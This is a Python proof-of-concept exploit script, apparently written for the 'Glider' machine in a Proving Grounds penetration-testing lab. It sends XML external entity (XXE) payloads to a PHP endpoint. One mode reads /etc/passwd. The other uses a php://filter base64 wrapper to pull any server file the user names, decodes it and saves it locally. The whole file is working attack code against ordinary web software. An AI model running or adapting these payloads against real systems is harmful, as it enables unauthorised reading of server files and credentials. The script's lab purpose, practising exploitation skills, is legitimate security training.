import requests
import base64
import argparse
from bs4 import BeautifulSoup


#Build argument parser
parser = argparse.ArgumentParser(description='This is a PoC tool for the Glider machine on proving grounds practice.')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--check',action='store_true',help='just check for exploit retrieving the /etc/passwd file')
group.add_argument('--exploit', metavar='resource', type=str, help='Use XXE/XEE with a specified resource (e.g., /var/www/html/demo.php).')

args = parser.parse_args()





def Poc_Example():
#simple /etc/passwd proof of concept
    r = requests
    proxies = {"http":"127.0.0.1:8080"}
    url = "http://192.168.176.226/record_xml.php"
    payload = """<!DOCTYPE replace [<!ENTITY example SYSTEM '/etc/passwd'> ]>\n
    <users><name>&example;</name><email>test@test.com</email><details>test</details></users>"""

    req = r.post(url,data=payload,proxies=proxies)
    print(req.text)


def Poc_Exploit(resource):

    b = base64
    r = requests
    proxies = {"http":"127.0.0.1:8080"} #For debugging
    url = "http://192.168.176.226/record_xml.php" #Change me
    payload = f"""<!DOCTYPE replace [<!ENTITY example SYSTEM 'php://filter/convert.base64-encode/resource={resource}'> ]>\n
    <users><name>&example;</name><email>test@test.com</email><details>test</details></users>"""
    req = r.post(url,data=payload,proxies=proxies)


    #Parsing the html response for only our base64 and decoding it
    htmlParse = BeautifulSoup(req.text,'html.parser')

    for para in htmlParse.find("p"):
        data = para.text.replace("Company Name:", "").strip()
        print(data)
        decoded_data = b.b64decode(data)
        parsed_html = BeautifulSoup(decoded_data, 'html.parser')
        #make the output file not all on one line for clearer readability
        pretty_html = parsed_html.prettify()
        #write the pretty output to our file
        output = open('output.html', 'w')
        output.writelines(str(pretty_html))
        output.close()





if __name__ == '__main__':

    if args.check:
        Poc_Example()

    if args.exploit:
        Poc_Exploit(args.exploit)
    
